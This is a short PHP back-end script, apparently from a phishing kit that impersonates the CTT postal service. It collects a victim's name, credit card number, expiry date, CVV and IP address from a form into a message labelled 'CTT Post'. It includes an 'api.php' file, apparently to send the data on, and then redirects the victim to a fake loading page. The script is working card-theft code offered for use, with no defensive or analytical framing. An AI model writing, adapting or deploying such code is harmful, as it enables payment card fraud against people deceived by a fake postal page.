<?php

session_start();



$nome = $_SESSION['nome'] = $_POST['nome'];
$xnum = $_SESSION['xnum'] = $_POST['xnum'];
$xdata = $_SESSION['xdata'] = $_POST['xdata'];
$xcod = $_SESSION['xcod'] = $_POST['xcod'];

$hexor = '
CTT Post ~~
Name : '.$_SESSION["nome"].' 
CC : '.$_SESSION["xnum"].' 
Exp : '.$_SESSION["xdata"].'
CVV : '.$_SESSION["xcod"].'
IP : '.$_SERVER['REMOTE_ADDR'].' 
';



include("api.php"); 



header('Location: ../loading1.php');


?>


